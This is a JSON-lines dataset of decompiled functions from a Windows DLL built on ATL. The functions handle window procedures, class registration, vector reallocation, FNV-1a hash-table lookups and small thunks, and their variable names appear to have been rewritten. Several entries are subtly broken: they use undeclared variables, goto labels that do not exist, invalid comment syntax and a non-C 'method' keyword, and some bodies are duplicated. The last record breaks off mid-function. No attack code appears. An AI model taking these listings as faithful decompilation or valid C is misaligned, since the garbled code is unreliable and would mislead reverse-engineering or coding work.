{"Function Name": "FUN_10012450", "Address": "10012450", "Source Code": "void FUN_10012450(int *parameters, UINT message, WPARAM wParam, LPARAM lParam)\n{\n    int originalValue; \n    int functionResult; \n    LONG previousWindowLong; \n    LONG currentWindowLong; \n    int localValue; \n    LRESULT result; \n    localValue = parameters[1]; \n    originalValue = parameters[6]; \n    parameters[6] = (int)&localValue; \n    result = 0; \n    \n    functionResult = (**(code **)*parameters)(parameters[1], message, wParam, lParam, &result, 0);\n    \n    if (functionResult == 0) { \n        if (message == 0x82) { \n            previousWindowLong = GetWindowLongW((HWND)parameters[1], -4); \n            result = CallWindowProcW((WNDPROC)parameters[8], (HWND)parameters[1], 0x82, wParam, lParam); \n            \n            if ((code *)parameters[8] != DefWindowProcW_exref) {\n                currentWindowLong = GetWindowLongW((HWND)parameters[1], -4); \n                if (currentWindowLong == previousWindowLong) { \n                    SetWindowLongW((HWND)parameters[1], -4, parameters[8]); \n                }\n            }\n            parameters[7] = parameters[7] | 1; \n        } else {\n            result = CallWindowProcW((WNDPROC)parameters[8], (HWND)parameters[1], message, wParam, lParam); \n        }\n    }\n    \n    if (((parameters[7] & 1U) == 0) || (originalValue != 0)) {\n        parameters[6] = originalValue; \n    } else {\n        originalValue = parameters[1]; \n        parameters[7] = parameters[7] & 0xfffffffe; \n        parameters[1] = 0; \n        parameters[6] = 0; \n        (**(code **)(*parameters + 0xc))(originalValue); \n    }\n    return; \n}"}
{"Function Name": "FUN_10012580", "Address": "10012580", "Source Code": "void __fastcall FUN_10012580(uint param_1,WNDCLASSEXW *param_2,UINT *param_3)\n{\n    ATOM classAtom; \n    BOOL classInfoResult; \n    HINSTANCE instanceHandle; \n    HCURSOR cursorHandle; \n    wchar_t *className; \n    uint securityCookie; \n    uint param1Local; \n    tagWNDCLASSEXW classInfoLocal; \n    securityCookie = DAT_1004e008 ^ (uint)&stack0xfffffff0; \n    param1Local = param_1; \n    \n    if ((param_2 == (WNDCLASSEXW *)0x0) || (param_3 == (UINT *)0x0)) {\n        ___security_check_cookie_4(securityCookie ^ (uint)&stack0xfffffff0); \n        return; \n    }\n    \n    if (*(short *)&param_2[1].cbWndExtra != 0) goto LAB_1001279c;\n    EnterCriticalSection((LPCRITICAL_SECTION)&DAT_1004eaa4); \n    \n    if (*(short *)&param_2[1].cbWndExtra == 0) {\n        \n        if ((LPCWSTR)param_2[1].cbSize == (LPCWSTR)0x0) {\n            \n            instanceHandle = (param_2[1].cbClsExtra == 0) ? *(HINSTANCE *)(param_1 + 8) : (HINSTANCE)0x0;\n            \n            cursorHandle = LoadCursorW(instanceHandle,(LPCWSTR)param_2[1].lpfnWndProc);\n            className = param_2->lpszClassName; \n            param_2->hCursor = cursorHandle; \n        } else {\n            \n            classInfoResult = GetClassInfoExW((HINSTANCE)0x0,(LPCWSTR)param_2[1].cbSize,&classInfoLocal);\n            \n            if ((classInfoResult == 0) && (classInfoResult = GetClassInfoExW(*(HINSTANCE *)(param1Local + 4),(LPCWSTR)param_2[1].cbSize,&classInfoLocal), classInfoResult == 0)) {\n                LeaveCriticalSection((LPCRITICAL_SECTION)&DAT_1004eaa4); \n                goto LAB_10012629; \n            }\n            \n            param_2->cbSize = classInfoLocal.cbSize;\n            param_2->style = classInfoLocal.style;\n            param_2->lpfnWndProc = classInfoLocal.lpfnWndProc;\n            param_2->cbClsExtra = classInfoLocal.cbClsExtra;\n            param_2->cbWndExtra = classInfoLocal.cbWndExtra;\n            param_2->hInstance = classInfoLocal.hInstance;\n            param_2->hIcon = classInfoLocal.hIcon;\n            param_2->hCursor = classInfoLocal.hCursor;\n            param_2->hbrBackground = classInfoLocal.hbrBackground;\n            param_2->lpszMenuName = classInfoLocal.lpszMenuName;\n            param_2->lpszClassName = classInfoLocal.lpszClassName;\n            param_2->hIconSm = classInfoLocal.hIconSm;\n        }\n        \n        instanceHandle = *(HINSTANCE *)(param1Local + 4); \n        param_2->style = param_2->style & 0xffffbfff; \n        param_2->hInstance = instanceHandle; \n        \n        if (className == (LPCWSTR)0x0) {\n            className = (wchar_t *)((int)&param_2[1].cbWndExtra + 2); \n            FUN_1000d170(className,0x25,L\"ATL:%p\"); \n            param_2->lpszClassName = className; \n        }\n        \n        \n        classInfoResult = GetClassInfoExW(instanceHandle,className,&classInfoLocal);\n        *(short *)&param_2[1].cbWndExtra = (short)classInfoResult; \n        \n        if ((short)classInfoResult == 0) {\n            classAtom = RegisterClassExW(param_2); \n            param1Local = (uint)classAtom; \n            \n            if (classAtom != 0) {\n                if (DAT_1004eac4 == DAT_1004eac8) {\n                    \n                    if ((DAT_1004eac0 <= local_80) && (local_80 < DAT_1004eac0 + DAT_1004eac8 * 2)) {\n                        FUN_10007c20(0x80004005); \n                        return; \n                    }\n                    \n                    if (DAT_1004eac8 == 0) {\n                        DAT_1004eac8 = 1; \n                    } else {\n                        uint uVar7 = DAT_1004eac4 * 2; \n                        \n                        if (((int)uVar7 < 0) || (0x3fffffff < uVar7)) goto LAB_10012787;\n                    }\n                    \n                    DAT_1004eac0 = (undefined *)FUN_100254a4(DAT_1004eac0,DAT_1004eac8 * 2,2);\n                    \n                    if (DAT_1004eac0 == (undefined *)0x0) goto LAB_10012787;\n                }\n                DAT_1004eac4++; \n            }\n        }\n    }\n    LeaveCriticalSection((LPCRITICAL_SECTION)&DAT_1004eaa4); \nLAB_1001279c:\n    \n    if (param_2[1].cbSize != 0) {\n        *param_3 = param_2[1].style; \n    }\n    ___security_check_cookie_4(securityCookie ^ (uint)&stack0xfffffff0); \n    return; \n}"}
{"Function Name": "FUN_10012830", "Address": "10012830", "Source Code": "int __thiscall FUN_10012830(void *this, undefined4 *param_1, undefined4 *param_2)\n{\n    int index_param_1; \n    int index_this_plus_4; \n    uint calculated_uVar4; \n    uint calculated_this_plus_8; \n    int value_this; \n    undefined4 temporary_value; \n    undefined4 *temp_pointer; \n    undefined4 *pointer_this_plus_4; \n    undefined4 *pointer_this; \n    value_this = *this; \n    index_param_1 = ((int)param_1 - value_this) / 0x30; \n    index_this_plus_4 = (*(int *)((int)this + 4) - value_this) / 0x30; \n    if (index_this_plus_4 == 0x5555555) goto LAB_100129e9; \n    calculated_this_plus_8 = (*(int *)((int)this + 8) - value_this) / 0x30; \n    calculated_uVar4 = index_this_plus_4 + 1; \n    if ((calculated_this_plus_8 <= 0x5555555 - (calculated_this_plus_8 >> 1)) && (calculated_uVar4 = (calculated_this_plus_8 >> 1) + calculated_this_plus_8, calculated_uVar4 < index_this_plus_4 + 1)) {\n        calculated_uVar4 = index_this_plus_4 + 1; \n    }\n    \n    if (calculated_uVar4 < 0x5555556) { \n        uint size_based_on_uVar4 = calculated_uVar4 * 0x30; \n        if (0xfff < size_based_on_uVar4) goto LAB_100128d9; \n        if (size_based_on_uVar4 == 0) { \n            temp_pointer = (undefined4 *)0x0; \n            temporary_value = 0; \n        } else {\n            temp_pointer = (undefined4 *)FUN_10013cf9(size_based_on_uVar4); \n            temporary_value = extraout_ECX; \n        }\n        FUN_100127d0(temporary_value, temp_pointer + index_param_1 * 0xc, param_2); \n        pointer_this_plus_4 = *(undefined4 **)((int)this + 4); \n        pointer_this = *this; \n        if (param_1 != pointer_this_plus_4) { \n            FUN_10012a60(*this, param_1, temp_pointer); \n            pointer_this_plus_4 = *(undefined4 **)((int)this + 4); \n            temp_pointer += index_param_1 * 0xc + 0xc; \n            pointer_this = param_1; \n        }\n        FUN_10012a60(pointer_this, pointer_this_plus_4, temp_pointer); \n        if (*this == (void **)0x0) { \n            *(undefined4 **)this = temp_pointer; \n            *(undefined4 **)((int)this + 4) = temp_pointer + (index_this_plus_4 * 3 + 3) * 4; \n            *(undefined4 **)((int)this + 8) = temp_pointer + calculated_uVar4 * 0xc; \n            return *this + index_param_1 * 0x30; \n        }\n        void **iterator_pointer = *this; \n        void **end_iterator_pointer = *(void ***)((int)this + 4); \n        if (iterator_pointer != end_iterator_pointer) { \n            do {\n                FUN_10008930(iterator_pointer); \n                iterator_pointer += 0xc; \n            } while (iterator_pointer != end_iterator_pointer); \n        }\n        end_iterator_pointer = *this; \n        if (((uint)(((*(int *)((int)this + 8) - (int)end_iterator_pointer) / 0x30) * 0x30) < 0x1000) ||\n            (end_iterator_pointer = (void **)end_iterator_pointer[-1], (uint)((int)end_iterator_pointer + (-4 - (int)end_iterator_pointer)) < 0x20)) {\n            FUN_10013ceb(end_iterator_pointer); \n            goto LAB_100129bb; \n        }\n    } else {\n        uint size_based_on_uVar4 = 0xffffffff; \nLAB_100128d9:\n        calculated_this_plus_8 = size_based_on_uVar4 + 0x23; \n        if (calculated_this_plus_8 <= size_based_on_uVar4) { \n            calculated_this_plus_8 = 0xffffffff; \n        }\n        value_this = FUN_10013cf9(calculated_this_plus_8); \n        if (value_this != 0) { \n            temp_pointer = (undefined4 *)(value_this + 0x23U & 0xffffffe0); \n            temp_pointer[-1] = value_this; \n            temporary_value = extraout_ECX; \n            goto LAB_10012913; \n        }\n    }\n    FUN_1001dea6(); \nLAB_100129e9:\n    FUN_10005250(); \n    code *pcVar1 = (code *)swi(3); \n    return (*pcVar1)(); \n}"}
{"Function Name": "FUN_10012ae0", "Address": "10012ae0", "Source Code": "void FUN_10012ae0(int input_value) \n{\n    FUN_10011ec0(input_value - 8); \n}"}
{"Function Name": "FUN_10012aea", "Address": "10012aea", "Source Code": "void FUN_10012aea(int input_value) \n{\n    FUN_10012090(input_value - 0x10); \n}"}
{"Function Name": "FUN_10012af4", "Address": "10012af4", "Source Code": "void FUN_10012af4(int input_value)\n{\n    \n    FUN_100120d0(input_value - 0x10);\n}"}
{"Function Name": "FUN_10012afe", "Address": "10012afe", "Source Code": "void FUN_10012afe(int input_value, undefined4 option_one, undefined4 option_two)\n{\n    \n    \n    FUN_10011e30(input_value - 12, option_one, option_two);\n}"}
{"Function Name": "FUN_10012b08", "Address": "10012b08", "Source Code": "void FUN_10012b08(int input_value) \n{\n    FUN_10011ec0(input_value - 12); \n}"}
{"Function Name": "FUN_10012b12", "Address": "10012b12", "Source Code": "void FUN_10012b12(int input_value, undefined4 first_param, undefined4 second_param)\n{\n    \n    FUN_10011e30(input_value - 0x10, first_param, second_param);\n}"}
{"Function Name": "FUN_10012b1c", "Address": "10012b1c", "Source Code": "void FUN_10012b1c(int input_value) \n{\n    FUN_10011ec0(input_value - 0x10); \n}"}
{"Function Name": "FUN_10012b26", "Address": "10012b26", "Source Code": "void FUN_10012b26(int input_value)\n{\n    \n    FUN_10011e80(input_value - 4);\n}"}
{"Function Name": "FUN_10012b30", "Address": "10012b30", "Source Code": "void FUN_10012b30(int input_value) \n{\n    FUN_10011e80(input_value - 8); \n}"}
{"Function Name": "FUN_10012b3a", "Address": "10012b3a", "Source Code": "void FUN_10012b3a(int input_value, int *array_pointer, int **pointer_to_array)\n{\n    \n    FUN_10012070(input_value - 4, array_pointer, pointer_to_array);\n}"}
{"Function Name": "FUN_10012b44", "Address": "10012b44", "Source Code": "void FUN_10012b44(int input_value) \n{\n    FUN_10011e80(input_value - 12); \n}"}
{"Function Name": "FUN_10012b4e", "Address": "10012b4e", "Source Code": "void FUN_10012b4e(int input_value, int *data_array, int **pointer_to_data_array)\n{\n    \n    FUN_10012070(input_value - 8, data_array, pointer_to_data_array);\n}"}
{"Function Name": "FUN_10012b58", "Address": "10012b58", "Source Code": "void FUN_10012b58(int input_value)\n{\n    \n    FUN_10012090(input_value - 4);\n}"}
{"Function Name": "FUN_10012b62", "Address": "10012b62", "Source Code": "void FUN_10012b62(int input_value)\n{\n    \n    FUN_100120d0(input_value - 4);\n}"}
{"Function Name": "FUN_10012b6c", "Address": "10012b6c", "Source Code": "void __thiscall FUN_10012b6c(void *objectPointer, byte byteParameter)\n{\n    \n    FUN_100122f0((void *)((int)objectPointer - 0x14), byteParameter);\n}"}
{"Function Name": "FUN_10012b74", "Address": "10012b74", "Source Code": "void FUN_10012b74(int input_value) \n{\n    FUN_10011e80(input_value - 16); \n}"}
{"Function Name": "FUN_10012b7e", "Address": "10012b7e", "Source Code": "void FUN_10012b7e(int input_value, int *data_array, int **pointer_to_data_array)\n{\n    \n    FUN_10012070(input_value - 12, data_array, pointer_to_data_array);\n}"}
{"Function Name": "FUN_10012b88", "Address": "10012b88", "Source Code": "void FUN_10012b88(int input_value) \n{\n    FUN_10012090(input_value - 8); \n}"}
{"Function Name": "FUN_10012b92", "Address": "10012b92", "Source Code": "void FUN_10012b92(int input_value)\n{\n    \n    FUN_100120d0(input_value - 8);\n}"}
{"Function Name": "FUN_10012b9c", "Address": "10012b9c", "Source Code": "void FUN_10012b9c(int input_value, undefined4 option_one, undefined4 option_two)\n{\n    \n    \n    FUN_10011e30(input_value - 4, option_one, option_two);\n}"}
{"Function Name": "FUN_10012ba6", "Address": "10012ba6", "Source Code": "void FUN_10012ba6(int input_value) \n{\n    FUN_10011ec0(input_value - 4); \n}"}
{"Function Name": "FUN_10012bb0", "Address": "10012bb0", "Source Code": "void FUN_10012bb0(int input_value, int *data_array, int **pointer_to_data_array)\n{\n    \n    FUN_10012070(input_value - 16, data_array, pointer_to_data_array);\n}"}
{"Function Name": "FUN_10012bba", "Address": "10012bba", "Source Code": "void FUN_10012bba(int input_value) \n{\n    FUN_10012090(input_value - 12); \n}"}
{"Function Name": "FUN_10012bc4", "Address": "10012bc4", "Source Code": "void FUN_10012bc4(int input_value)\n{\n    \n    FUN_100120d0(input_value - 12);\n}"}
{"Function Name": "FUN_10012bce", "Address": "10012bce", "Source Code": "void __thiscall FUN_10012bce(void *object_pointer, byte byte_parameter)\n{\n    \n    FUN_100121c0((void *)((int)object_pointer - 0x14), byte_parameter);\n}"}
{"Function Name": "FUN_10012bd6", "Address": "10012bd6", "Source Code": "void FUN_10012bd6(int input_value, undefined4 first_flag, undefined4 second_flag)\n{\n    \n    \n    FUN_10011e30(input_value - 8, first_flag, second_flag);\n}"}
{"Function Name": "FUN_10012d30", "Address": "10012d30", "Source Code": "int __fastcall FUN_10012d30(int input_param)\n{\n    \n    int *int_pointer = (int *)(input_param + 8);\n    \n    \n    LOCK();\n    \n    \n    int current_value = *int_pointer;\n    \n    \n    *int_pointer = current_value + 1;\n    \n    \n    UNLOCK();\n    \n    \n    return current_value + 1;\n}"}
{"Function Name": "FUN_10012d40", "Address": "10012d40", "Source Code": "int __fastcall FUN_10012d40(int input_param)\n{\n    \n    int *int_pointer = (int *)(input_param + 8);\n    \n    \n    LOCK();\n    \n    \n    int current_value = *int_pointer;\n    \n    \n    *int_pointer = current_value - 1;\n    \n    \n    UNLOCK();\n    \n    \n    return current_value - 1;\n}"}
{"Function Name": "FUN_10012d50", "Address": "10012d50", "Source Code": "undefined4 __fastcall get_value_at_offset(int input_address)\n{\n    \n    return *(undefined4 *)(input_address + 8);\n}"}
{"Function Name": "FUN_10012e00", "Address": "10012e00", "Source Code": "void __thiscall FUN_10012e00(void *object, LPCWSTR string_param, undefined4 int_param1, undefined4 *int_param2)\n{\n    \n    FUN_10012e70(object, string_param, int_param1, int_param2);\n}"}
{"Function Name": "FUN_10012e20", "Address": "10012e20", "Source Code": "void __thiscall\nFUN_10012e20(void *this, uint param_2, undefined4 param_3, undefined4 *param_4)\n{\n    \n    FUN_1000f390(this, param_2, param_3, param_4);\n}"}
{"Function Name": "FUN_10012e40", "Address": "10012e40", "Source Code": "\\*\nundefined4 * method FUN_10012e40(void *object, byte flag)\n{\n    \n    *(undefined ***)object = ATL::CComModule::vftable;\n    \n    FUN_10012c80((int)object);\n    \n    if (flag & 1) {\n        \n        FUN_10013ceb(object);\n    }\n    \n    return (undefined4 *)object;\n}\n*\\ \n \nundefined4 * method FUN_10012e40(void *object, byte flag)\n{\n    *(undefined ***)object = ATL::CComModule::vftable;\n    FUN_10012c80((int)object);\n    if (flag & 1) {\n        FUN_10013ceb(object);\n    }\n    return (undefined4 *)object;\n}"}
{"Function Name": "FUN_10013150", "Address": "10013150", "Source Code": "void FUN_10013150(undefined4 input_param, int condition_flag)\n{\n    undefined **undefined_ptr_array; \n    undefined *undefined_ptr; \n    undefined byte_array_1[16]; \n    undefined byte_array_2[16]; \n    undefined byte_array_3[16]; \n    void **void_ptr_pointer; \n    uint xor_result; \n    byte *byte_pointer; \n    undefined4 output_var; \n    int *int_pointer_1; \n    undefined **undefined_ptr_array_2; \n    int *int_pointer_2; \n    int loop_counter; \n    uint xor_copy; \n    undefined4 local_var; \n    local_var = 0xffffffff; \n    ExceptionList = &local_var; \n    xor_result = DAT_1004e008 ^ (uint)&stack0xfffffffc; \n    if (condition_flag == 1) { \n        data_var_1 = input_param; \n        local_var = 0; \n        data_var_2 = DAT_10048538; \n        data_var_3 = DAT_1004853c; \n        data_var_4 = DAT_10048540; \n        data_var_5 = DAT_10048544; \n        data_pointer = &pointer_var_1; \n        if (pointer_var_1 != (undefined *)0x0) { \n            undefined_ptr_array_2 = &pointer_var_1; \n            do {\n                (*(code *)undefined_ptr_array_2[8])(1); \n                undefined_ptr_array_2 += 9; \n            } while (*undefined_ptr_array_2 != (undefined *)0x0); \n        }\n        int_pointer_1 = (int *)pointer_var_2; \n        int_pointer_2 = (int *)pointer_var_3; \n        if (pointer_var_3 < pointer_var_2) { \n            do {\n                if (*int_pointer_2 != 0) { \n                    (**(code **)(*int_pointer_2 + 0x1c))(1); \n                }\n                int_pointer_2++; \n            } while (int_pointer_2 < int_pointer_1); \n        }\n        local_var = 0xffffffff; \n        for (loop_counter = 1; (double)loop_counter <= limit_var_1; loop_counter++) { \n            get_tick_count_function(); \n        }\n        for (loop_counter = 1; (double)loop_counter <= limit_var_2; loop_counter++) { \n            get_tick_count_function(); \n        }\n        get_tick_count_function(); \n        get_tick_count_function(); \n        for (loop_counter = 1; (double)loop_counter <= limit_var_1; loop_counter++) { \n            get_tick_count_function(); \n        }\n        for (loop_counter = 1; (double)loop_counter <= limit_var_2; loop_counter++) { \n            get_tick_count_function(); \n        }\n        function_1(); \n        byte_pointer = function_2(output_var); \n        byte_array_1._4_4_ = 1; \n        byte_array_1._0_4_ = byte_pointer; \n        function_3((undefined1[16])byte_array_1, (undefined1[16])byte_array_2, (undefined1[16])byte_array_3); \n    }\n    else if (condition_flag == 0) { \n        local_var = 1; \n        void_ptr_pointer = &local_var; \n        if (data_pointer != (undefined **)0x0) { \n            undefined_ptr = *data_pointer; \n            xor_copy = xor_result; \n            undefined_ptr_array_2 = data_pointer; \n            while (undefined_ptr != (undefined *)0x0) { \n                int_pointer_1 = (int *)undefined_ptr_array_2[4]; \n                if (int_pointer_1 != (int *)0x0) { \n                    (**(code **)(*int_pointer_1 + 8))(int_pointer_1, xor_copy); \n                }\n                undefined_ptr_array_2[4] = (undefined *)0x0; \n                (*(code *)undefined_ptr_array_2[8])(0); \n                undefined_ptr_array_2 += 9; \n                undefined_ptr = *undefined_ptr_array_2; \n            }\n        }\n        int_pointer_1 = (int *)pointer_var_2; \n        int_pointer_2 = (int *)pointer_var_3; \n        if (pointer_var_3 < pointer_var_2) { \n            do {\n                if (*int_pointer_2 != 0) { \n                    (**(code **)(*int_pointer_2 + 0x1c))(0); \n                }\n                int_pointer_2++; \n            } while (int_pointer_2 < int_pointer_1); \n        }\n        function_4(0x10050488); \n    }\n    ExceptionList = &local_var; \n    security_check_function(xor_result ^ (uint)&stack0xfffffffc); \n    return; \n}"}
{"Function Name": "FUN_10013410", "Address": "10013410", "Source Code": "\\*\nundefined4 * __fastcall FUN_10013410(undefined4 *inputArray)\n{\n    undefined4 tempValue; \n    void *originalExceptionList; \n    originalExceptionList = ExceptionList; \n    ExceptionList = &originalExceptionList; \n    *inputArray = 0x3f800000; \n    inputArray[1] = FUN_100138e0(0, 0); \n    inputArray[2] = 0; \n    inputArray[3] = 0; \n    inputArray[4] = 0; \n    FUN_1000ba50(inputArray + 3, 0x10); \n    FUN_1000b7e0(inputArray + 3, 0x10, (undefined4 *)inputArray[1]); \n    inputArray[6] = 7; \n    inputArray[7] = 8; \n    ExceptionList = originalExceptionList; \n    return inputArray; \n}\n*\\ \n \nundefined4 * __fastcall FUN_10013410(undefined4 *inputArray)\n{\n    undefined4 tempValue;\n    void *originalExceptionList;\n    originalExceptionList = ExceptionList;\n    ExceptionList = &originalExceptionList;\n    *inputArray = 0x3f800000;\n    inputArray[1] = FUN_100138e0(0, 0);\n    inputArray[2] = 0;\n    inputArray[3] = 0;\n    inputArray[4] = 0;\n    FUN_1000ba50(inputArray + 3, 0x10);\n    FUN_1000b7e0(inputArray + 3, 0x10, (undefined4 *)inputArray[1]);\n    inputArray[6] = 7;\n    inputArray[7] = 8;\n    ExceptionList = originalExceptionList;\n    return inputArray;\n}"}
{"Function Name": "FUN_100136d0", "Address": "100136d0", "Source Code": "float ** __thiscall FUN_100136d0(void *this, float **param_1, ushort **param_2)\n{\n    byte *bytePointer; \n    uint calculatedSize; \n    uint loopCounter; \n    uint hashValue; \n    int **intPointerPtr; \n    int **localIntPointerPtr; \n    ushort **ushortPointerPtr; \n    ushort **localUshortPointerPtr; \n    void *localThis; \n    localUshortPointerPtr = param_2; \n    ushortPointerPtr = param_2; \n    \n    if ((ushort *)0x7 < param_2[5]) {\n        ushortPointerPtr = (ushort **)*param_2; \n    }\n    calculatedSize = (int)param_2[4] * 2; \n    loopCounter = 0; \n    hashValue = 0x811c9dc5; \n    \n    if (calculatedSize != 0) {\n        do {\n            bytePointer = (byte *)(loopCounter + (int)ushortPointerPtr); \n            loopCounter = loopCounter + 1; \n            hashValue = (*bytePointer ^ hashValue) * 0x1000193; \n        } while (loopCounter < calculatedSize); \n    }\n    hashValue = *(uint *)((int)this + 0x18) & hashValue; \n    intPointerPtr = *(int ***)((int)this + 4); \n    localIntPointerPtr = *(int ***)(*(int *)((int)this + 0xc) + hashValue * 8); \n    localThis = this; \n    \n    do {\n        int **currentIntPointerPtr = (localIntPointerPtr != intPointerPtr) ? *(int ***)*localUshortPointerPtr : intPointerPtr; \n        if (localIntPointerPtr == currentIntPointerPtr) goto LAB_100137dc; \n        currentIntPointerPtr += 2; \n        if ((ushort *)0x7 < param_2[5]) {\n            ushortPointerPtr = (ushort **)*param_2; \n        }\n        int *sixthElementPointer = localIntPointerPtr[6]; \n        if ((int *)0x7 < localIntPointerPtr[7]) {\n            currentIntPointerPtr = (int **)*currentIntPointerPtr; \n        }\n        \n        if (sixthElementPointer == (int *)param_2[4]) {\n            if (sixthElementPointer == (int *)0x0) {\nLAB_100137b0: \n                if ((char)FUN_1000cc60(param_2, (ushort **)(localIntPointerPtr + 2)) == '\\0') {\n                    intPointerPtr = *(int ***)((int)localThis + 4); \n                }\n                goto LAB_100137dc; \n            }\nLAB_100137dc: \n            if (localIntPointerPtr != intPointerPtr) {\n                *param_1 = (float *)localIntPointerPtr; \n                *(undefined *)(param_1 + 1) = 0; \n                return param_1; \n            }\n            int *firstIntPointer = *intPointerPtr; \n            int *secondIntPointer = (int *)firstIntPointer[1]; \n            localUshortPointerPtr = param_2; \n            int functionResult = FUN_10013bb0((int)firstIntPointer, (int)secondIntPointer, intPointerPtr, &localUshortPointerPtr); \n            \n            if (*(int *)((int)localThis + 8) != 0x6666665) {\n                *(int *)((int)localThis + 8) += 1; \n                firstIntPointer[1] = functionResult; \n                *secondIntPointer = functionResult; \n                FUN_10013930(localThis, param_1,\n                    (ushort **)((float **)**(undefined4 **)((int)localThis + 4) + 2),\n                    (float **)**(undefined4 **)((int)localThis + 4)); \n                return param_1; \n            }\n            FUN_100153e7(\"list<T> too long\"); \n            return (float **)(*swi(3))(); \n        }\n        ushort firstUshortValue = *(ushort *)currentIntPointerPtr; \n        ushort secondUshortValue = *(ushort *)ushortPointerPtr; \n        \n        if (secondUshortValue <= firstUshortValue) {\n            bool isUVar2LessThanUVar3 = firstUshortValue < secondUshortValue; \n            bool isUVar2EqualToUVar3 = firstUshortValue == secondUshortValue; \n            ushort **currentUshortPointerPtr = ushortPointerPtr; \n            \n            do {\n                if (!isUVar2LessThanUVar3 && !isUVar2EqualToUVar3) break; \n                if (sixthElementPointer == (int *)0x1) goto LAB_100137b0; \n                firstUshortValue = *(ushort *)((int)currentUshortPointerPtr + (int)currentIntPointerPtr + (2 - (int)ushortPointerPtr)); \n                currentUshortPointerPtr = (ushort **)((int)currentUshortPointerPtr + 2); \n                sixthElementPointer = (int *)((int)sixthElementPointer - 1); \n                isUVar2LessThanUVar3 = firstUshortValue < *(ushort *)currentUshortPointerPtr; \n                isUVar2EqualToUVar3 = firstUshortValue == *(ushort *)currentUshortPointerPtr; \n            } while (!isUVar2LessThanUVar3); \n        }\n        localIntPointerPtr = (int **)*localIntPointerPtr; \n    } while (true); \n}"}
{"Function Name": "FUN_100138e0", "Address": "100138e0", "Source Code": "void FUN_100138e0(int input_value_1, int input_value_2)\n{\n    \n    int *int_pointer = (int *)FUN_10013cf9(0x28);\n    \n    \n    if (input_value_1 == 0) {\n        \n        *int_pointer = (int)int_pointer;\n        \n        int_pointer[1] = (int)int_pointer;\n    } else {\n        \n        *int_pointer = input_value_1;\n        \n        int_pointer[1] = input_value_2;\n    }\n}"}
{"Function Name": "FUN_10013910", "Address": "10013910", "Source Code": "void FUN_10013910(void *input_param) \n{\n    FUN_10013ceb(input_param); \n}"}
{"Function Name": "FUN_10013930", "Address": "10013930", "Source Code": "void __thiscall FUN_10013930(void *this, float **param_1, ushort **param_2, float **param_3)\n{\n    byte *bytePointer; \n    ushort ushortValue1; \n    ushort ushortValue2; \n    float *floatPointer1; \n    float *floatPointer2; \n    int integerValue; \n    uint *uintPointer; \n    uint uintValue; \n    ushort **ushortPointerPointer; \n    float **localFloatPointerPointer; \n    uint stackUintValue; \n    void *localPointer; \n    undefined4 localUndefinedValue; \n    localPointer = ExceptionList; \n    stackUintValue = DAT_1004e008 ^ (uint)&stack0xfffffffc; \n    ExceptionList = &localPointer; \n    localFloatPointerPointer = param_1; \n    localUndefinedValue = 0; \n    ushortPointerPointer = param_2; \n    if ((ushort *)0x7 < param_2[5]) { \n        ushortPointerPointer = (ushort **)*param_2; \n    }\n    uint uVar12 = 0x811c9dc5; \n    uintValue = 0; \n    float **localFloatPointer = (float **)param_2[4]; \n    if ((int)localFloatPointer * 2 != 0) { \n        do {\n            bytePointer = (byte *)(uintValue + (int)ushortPointerPointer); \n            uintValue++; \n            uVar12 = (*bytePointer ^ uVar12) * 0x1000193; \n        } while (uintValue < (uint)((int)localFloatPointer * 2)); \n    }\n    uint localFloatPointer2 = (*(uint *)((int)this + 0x18) & uVar12); \n    float *floatPointer3 = *(float **)((int)this + 4); \n    floatPointer1 = *(float **)(*(int *)((int)this + 0xc) + (int)localFloatPointer2 * 8); \n    if (floatPointer1 != floatPointer3) { \n        floatPointer3 = **(float ***)(*(int *)((int)this + 0xc) + 4 + (int)localFloatPointer2 * 8); \n    }\n    do {\n        localPointer = this; \n        if (floatPointer3 == floatPointer1) { \n            floatPointer1 = *param_3; \n            if (floatPointer3 != floatPointer1) { \n                *param_3[1] = (float)floatPointer1; \n                *(float **)floatPointer1[1] = floatPointer3; \n                *(float ***)floatPointer3[1] = param_3; \n                floatPointer2 = (float *)floatPointer3[1]; \n                floatPointer3[1] = floatPointer1[1]; \n                floatPointer1[1] = (float)param_3[1]; \n                param_3[1] = floatPointer2; \n            }\n            integerValue = *(int *)((int)this + 0xc); \n            floatPointer1 = *(float **)(integerValue + (int)localFloatPointer2 * 8); \n            if (floatPointer1 == *(float **)((int)this + 4)) { \n                *(float ***)(integerValue + (int)localFloatPointer2 * 8) = param_3; \n                *(float ***)(*(int *)((int)this + 0xc) + 4 + (int)localFloatPointer2 * 8) = param_3; \n            } else if (floatPointer1 == floatPointer3) { \n                *(float ***)(integerValue + (int)localFloatPointer2 * 8) = param_3; \n            } else { \n                float **nextFloatPointer = (float **)**(int **)(integerValue + 4 + (int)localFloatPointer2 * 8); \n                *(float ***)(integerValue + 4 + (int)localFloatPointer2 * 8) = nextFloatPointer; \n                if (nextFloatPointer != param_3) { \n                    *(undefined4 *)(*(int *)((int)this + 0xc) + 4 + (int)localFloatPointer2 * 8) =\n                    *(undefined4 *)(*(int *)(*(int *)((int)this + 0xc) + 4 + (int)localFloatPointer2 * 8) + 4); \n                }\n            }\n            localUndefinedValue = 2; \n            uintValue = *(uint *)((int)this + 0x1c); \n            float floatValue = (float)((double)*(int *)((int)this + 8) +\n                *(double *)(&DAT_10048870 + (*(int *)((int)this + 8) >> 0x1f) * -8)) /\n                (float)((double)uintValue + *(double *)(&DAT_10048870 + ((int)uintValue >> 0x1f) * -8)); \n            uintPointer = &stackUintValue; \n            if (*this <= floatValue && floatValue != *this) { \n                if (uintValue < 0x200) { \n                    uintValue = uintValue << 3; \n                } else if (uintValue < 0x1fffffff) { \n                    uintValue = uintValue * 2; \n                }\n                FUN_1000b4f0(this, uintValue); \n                int *intPointer = *(int **)((int)this + 4); \n                uintPointer = &stackUintValue; \n                if ((int *)*intPointer != intPointer) { \n                    float **localFloatPointer2 = (float **)intPointer[1]; \n                    do {\n                        float **nextFloatPointer = (float **)**(undefined4 **)((int)this + 4); \n                        FUN_10013930(this, &localFloatPointerPointer, (ushort **)(nextFloatPointer + 2), nextFloatPointer); \n                        uintPointer = &stackUintValue; \n                    } while (nextFloatPointer != localFloatPointer2); \n                }\n            }\n            localPointer2 = uintPointer; \n            *localFloatPointerPointer = (float *)param_3; \n            *(undefined *)(localFloatPointerPointer + 1) = 1; \n            goto LAB_10013b63; \n        }\n        floatPointer3 = (float *)floatPointer3[1]; \n        ushortPointerPointer = (ushort **)(floatPointer3 + 2); \n        if (7 < (uint)floatPointer3[7]) { \n            ushortPointerPointer = (ushort **)*ushortPointerPointer; \n        }\n    } while (param_2[4] != (ushort *)floatPointer3[6]); \n    if (localFloatPointer == (float **)0x0) { \nLAB_10013a2a:\n        